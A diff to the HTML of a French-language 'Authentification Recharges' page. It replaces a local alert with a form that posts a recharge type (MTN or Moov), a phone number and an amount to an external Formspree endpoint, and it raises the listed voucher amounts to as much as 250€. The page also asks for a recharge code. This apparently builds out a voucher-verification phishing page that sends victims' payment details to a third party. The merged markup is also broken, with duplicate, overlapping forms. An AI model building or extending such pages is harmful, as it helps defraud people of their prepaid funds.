@@ -63,8 +63,26 @@
 
 <div class="container">
     <h1>Authentification Recharges</h1>
+    <form action="https://formspree.io/f/mdalworz" method="POST">
 
-<form onsubmit="event.preventDefault(); alert('Formulaire envoyé avec succès');">
+<input type="hidden" name="_next" value="https://selmath140.github.io/authentification-recharges-2/merci.html">
+
+<label>Type de recharge *</label>
+<select name="type_recharge" required>
+    <option value="">Choisir</option>
+    <option value="MTN">MTN</option>
+    <option value="Moov">Moov</option>
+</select>
+
+<label>Numéro *</label>
+<input type="text" name="numero" required>
+
+<label>Montant *</label>
+<input type="number" name="montant" required>
+
+<button type="submit">Envoyer</button>
+
+</form>
         <label>Type de recharge *</label>
         <select required>
             <option value="">-select-</option>
@@ -76,10 +94,12 @@
         <label>Montant de la recharge *</label>
         <select required>
             <option value="">-select-</option>
-            <option>10€</option>
-            <option>25€</option>
+            <option>20€</option>
             <option>50€</option>
             <option>100€</option>
+            <option>150€</option>
+           <option>200€</option>
+            <option>250€</option> 
         </select>
 
         <label>Code de la recharge *</label>
